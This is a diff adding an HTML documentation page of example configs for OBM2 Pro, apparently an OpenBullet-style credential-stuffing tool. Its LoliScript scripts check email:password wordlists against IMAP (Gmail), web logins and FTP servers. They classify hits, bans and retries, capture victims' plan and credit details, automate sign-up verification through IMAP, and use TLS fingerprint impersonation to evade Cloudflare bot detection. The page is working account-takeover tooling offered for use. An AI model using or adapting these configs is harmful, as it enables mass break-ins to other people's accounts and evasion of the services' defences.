@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Examples — OBM2 Pro</title>
+  <meta name="description" content="Real-world LoliScript examples for OBM2 Pro: IMAP credential check, HTTP login, FTP listing, Selenium form fill."/>
+  <link rel="icon" href="../favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@400;600;700&display=swap"/>
+  <link rel="stylesheet" href="../assets/css/docs.css"/>
+</head>
+<body>
+
+<header class="site-header">
+  <button class="sidebar-toggle" id="sidebar-toggle">&#9776;</button>
+  <a class="logo" href="index.html"><img src="../M2Logo.png" alt="OBM2 Pro"/>OBM2 Pro<span class="version-badge">v3.1.2</span></a>
+  <nav class="header-nav">
+    <a href="index.html">Home</a><a href="usage.html">Usage</a><a href="stacker.html">Stacker</a>
+    <a href="variables.html">Variables</a><a href="loliscript.html">LoliScript</a>
+    <a href="remote.html">Remote API</a><a href="examples.html" class="active">Examples</a>
+  </nav>
+  <div class="header-spacer"></div>
+  <div class="header-search">
+    <span class="search-icon">&#128269;</span>
+    <input type="text" id="search-input" placeholder="Search docs…" autocomplete="off"/>
+    <div class="search-results" id="search-results"></div>
+  </div>
+</header>
+
+<div class="docs-layout">
+  <aside class="docs-sidebar">
+    <div class="sidebar-group">
+      <div class="sidebar-group-title">Examples</div>
+      <a class="sidebar-link" href="#imap-check" data-target="imap-check">IMAP Credential Check</a>
+      <a class="sidebar-link" href="#http-login" data-target="http-login">HTTP Login + Parse</a>
+      <a class="sidebar-link" href="#tls-login" data-target="tls-login">TLS Request Login</a>
+      <a class="sidebar-link" href="#ftp-check" data-target="ftp-check">FTP File Check</a>
+      <a class="sidebar-link" href="#selenium-test" data-target="selenium-test">Selenium Form Fill</a>
+      <a class="sidebar-link" href="#email-verify" data-target="email-verify">Email Code Extraction</a>
+    </div>
+  </aside>
+
+  <main class="docs-content">
+    <div class="docs-content-inner">
+      <div class="breadcrumb"><a href="index.html">Docs</a><span class="sep">/</span><span>Examples</span></div>
+      <h1>Examples</h1>
+      <p class="page-subtitle">Real-world LoliScript configs demonstrating common use-cases. All examples assume the wordlist format is <code>email:password</code>.</p>
+
+      <!-- IMAP Check -->
+      <section class="block-section" id="imap-check">
+        <div class="block-header">
+          <div class="block-icon block-cyan">&#128231;</div>
+          <div class="block-header-text">
+            <h2>IMAP Credential Check</h2>
+            <div class="block-desc">Verify email/password pairs against an IMAP server. Classifies success, failure, and ban.</div>
+          </div>
+        </div>
+        <div class="code-wrapper">
+          <pre><code># IMAP Credential Checker
+# Wordlist format: email:password
+# Split into &lt;email&gt; and &lt;pass&gt; via wordlist type or SET
+
+IMAP Connect "imap.gmail.com" "993" (UseSSL=True) 30000
+IMAP Login "&lt;email&gt;" "&lt;pass&gt;"
+IMAP GetMailCount "totalMails"
+IMAP Logout
+IMAP Disconnect
+
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "&lt;ERROR&gt;" DoesNotExist
+  KEYCHAIN Failure OR
+    KEY "&lt;ERROR&gt;" Contains "Authentication failed"
+    KEY "&lt;ERROR&gt;" Contains "Invalid credentials"
+  KEYCHAIN Ban OR
+    KEY "&lt;ERROR&gt;" Contains "Too many"
+    KEY "&lt;ERROR&gt;" Contains "rate limit"
+  KEYCHAIN Retry OR
+    KEY "&lt;ERROR&gt;" Contains "timed out"
+    KEY "&lt;ERROR&gt;" Contains "Connection refused"</code></pre>
+        </div>
+      </section>
+
+      <!-- HTTP Login -->
+      <section class="block-section" id="http-login">
+        <div class="block-header">
+          <div class="block-icon block-amber">&#127760;</div>
+          <div class="block-header-text">
+            <h2>HTTP Login + Parse Capture</h2>
+            <div class="block-desc">POST login form, parse user data from the JSON response, capture for Hits DB.</div>
+          </div>
+        </div>
+        <div class="code-wrapper">
+          <pre><code># HTTP Login with capture
+REQUEST GET "https://example.com/csrf"
+PARSE &lt;SOURCE&gt; JSON "csrfToken" -> "csrf"
+
+REQUEST POST "https://example.com/api/login"
+  CONTENT-TYPE:"application/json"
+  POSTDATA:"{\"email\":\"&lt;email&gt;\",\"password\":\"&lt;pass&gt;\",\"_csrf\":\"&lt;csrf&gt;\"}"
+
+# Check for successful login
+IF "&lt;RESPONSECODE&gt;" EqualTo "200"
+  PARSE &lt;SOURCE&gt; JSON "user.plan" -> "plan" CAP
+  PARSE &lt;SOURCE&gt; JSON "user.credits" -> "credits" CAP
+  PARSE &lt;SOURCE&gt; JSON "user.expiresAt" -> "expiry" CAP
+END
+
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "&lt;RESPONSECODE&gt;" EqualTo "200"
+    KEY "&lt;SOURCE&gt;" Contains "\"authenticated\":true"
+  KEYCHAIN Failure OR
+    KEY "&lt;RESPONSECODE&gt;" EqualTo "401"
+    KEY "&lt;SOURCE&gt;" Contains "invalid_credentials"
+  KEYCHAIN Ban OR
+    KEY "&lt;RESPONSECODE&gt;" EqualTo "429"</code></pre>
+        </div>
+      </section>
+
+      <!-- TLS Login -->
+      <section class="block-section" id="tls-login">
+        <div class="block-header">
+          <div class="block-icon block-amber">&#128274;</div>
+          <div class="block-header-text">
+            <h2>TLS Request Login (Cloudflare-protected site)</h2>
+            <div class="block-desc">Use TLS fingerprint impersonation to bypass bot-detection on Cloudflare-protected endpoints.</div>
+          </div>
+        </div>
+        <div class="code-wrapper">
+          <pre><code># TLS login bypassing JA3 fingerprinting
+TLSREQUEST GET "https://protected-site.com/login" TLSPROFILE:"Chrome"
+PARSE &lt;SOURCE&gt; LR "name=\"_token\" value=\"" "\"" -> "csrfToken"
+
+TLSREQUEST POST "https://protected-site.com/login" TLSPROFILE:"Chrome"
+  CONTENT-TYPE:"application/x-www-form-urlencoded"
+  POSTDATA:"_token=&lt;csrfToken&gt;&amp;email=&lt;email&gt;&amp;password=&lt;pass&gt;"
+
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "&lt;ADDRESS&gt;" Contains "/dashboard"
+  KEYCHAIN Failure OR
+    KEY "&lt;SOURCE&gt;" Contains "Invalid credentials"
+  KEYCHAIN Ban OR
+    KEY "&lt;RESPONSECODE&gt;" EqualTo "403"</code></pre>
+        </div>
+      </section>
+
+      <!-- FTP Check -->
+      <section class="block-section" id="ftp-check">
+        <div class="block-header">
+          <div class="block-icon block-violet-light">&#128193;</div>
+          <div class="block-header-text">
+            <h2>FTP Credential Check + File Listing</h2>
+            <div class="block-desc">Validate FTP credentials and capture a list of files in the root directory.</div>
+          </div>
+        </div>
+        <div class="code-wrapper">
+          <pre><code># FTP credential check
+# Wordlist format: host:user:pass  (use PARSE to split)
+PARSE "&lt;data&gt;" LR "" ":" -> "ftpHost"
+PARSE "&lt;data&gt;" LR ":" ":" -> "ftpUser"
+PARSE "&lt;data&gt;" LR ".*:.*:" "" -> "ftpPass"
+
+FTP Connect "&lt;ftpHost&gt;" "21" "&lt;ftpUser&gt;" "&lt;ftpPass&gt;" (UseSSL=False) 15000
+FTP ListFiles "/" "rootFiles"
+FTP Disconnect
+
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "&lt;ERROR&gt;" DoesNotExist
+  KEYCHAIN Failure OR
+    KEY "&lt;ERROR&gt;" Contains "530"
+    KEY "&lt;ERROR&gt;" Contains "Login"
+  KEYCHAIN Retry OR
+    KEY "&lt;ERROR&gt;" Contains "timed out"</code></pre>
+        </div>
+      </section>
+
+      <!-- Selenium -->
+      <section class="block-section" id="selenium-test">
+        <div class="block-header">
+          <div class="block-icon block-green">&#129302;</div>
+          <div class="block-header-text">
+            <h2>Selenium Form Fill &amp; Unit Test</h2>
+            <div class="block-desc">Fill a login form with Selenium, verify dashboard title, capture plan type.</div>
+          </div>
+        </div>
+        <div class="code-wrapper">
+          <pre><code># Selenium login test
+NAVIGATE "https://example.com/login" TIMEOUT:15000
+
+ELEMENTACTION id "email" ClearAndType "&lt;email&gt;"
+ELEMENTACTION id "password" ClearAndType "&lt;pass&gt;"
+ELEMENTACTION id "submit" Click
+
+# Wait for redirect
+UTILITY Wait 2000
+
+ELEMENTACTION selector "h1.plan-name" GetText -> "planName" CAP
+EXECUTEJS "return window.location.pathname;" -> "currentPath"
+
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "&lt;currentPath&gt;" Contains "/dashboard"
+  KEYCHAIN Failure OR
+    KEY "&lt;currentPath&gt;" Contains "/login"
+    KEY "&lt;SOURCE&gt;" Contains "Invalid"</code></pre>
+        </div>
+      </section>
+
+      <!-- Email Code -->
+      <section class="block-section" id="email-verify">
+        <div class="block-header">
+          <div class="block-icon block-cyan">&#128231;</div>
+          <div class="block-header-text">
+            <h2>Email Verification Code Extraction</h2>
+            <div class="block-desc">Register an account, wait for the verification email, extract the code via IMAP, submit it.</div>
+          </div>
+        </div>
+        <div class="code-wrapper">
+          <pre><code># Register account
+REQUEST POST "https://example.com/api/register"
+  CONTENT-TYPE:"application/json"
+  POSTDATA:"{\"email\":\"&lt;email&gt;\",\"password\":\"&lt;pass&gt;\"}"
+
+# Wait for email to arrive
+UTILITY Wait 5000
+
+# Connect to IMAP and fetch verification email
+IMAP Connect "imap.gmail.com" "993" (UseSSL=True) 30000
+IMAP Login "&lt;email&gt;" "&lt;pass&gt;"
+IMAP SearchMails "FROM \"noreply@example.com\" SUBJECT \"Verify\"" "mailCount"
+IMAP ReadMail 0 "verifyMail"
+IMAP Logout
+IMAP Disconnect
+
+# Extract 6-digit code from email body
+PARSE "&lt;verifyMail&gt;" REGEX "(\d{6})" GROUP:1 -> "verifyCode"
+
+# Submit the code
+REQUEST POST "https://example.com/api/verify"
+  CONTENT-TYPE:"application/json"
+  POSTDATA:"{\"email\":\"&lt;email&gt;\",\"code\":\"&lt;verifyCode&gt;\"}"
+
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "&lt;RESPONSECODE&gt;" EqualTo "200"
+    KEY "&lt;verifyCode&gt;" Exists
+  KEYCHAIN Failure OR
+    KEY "&lt;ERROR&gt;" Contains "Authentication"
+    KEY "&lt;mailCount&gt;" EqualTo "0"</code></pre>
+        </div>
+      </section>
+
+    </div>
+  </main>
+</div>
+
+<footer class="docs-footer">
+  <span>OBM2 Pro &mdash; OpenBullet M2 Pro Documentation</span>
+  <span><a href="https://github.com/ObM2/ObM2Pro">GitHub</a> &middot; <a href="contribute.html">Contribute</a></span>
+</footer>
+<button id="back-to-top" title="Back to top">&#8679;</button>
+<script src="../assets/js/docs.js"></script>
+</body>
+</html>
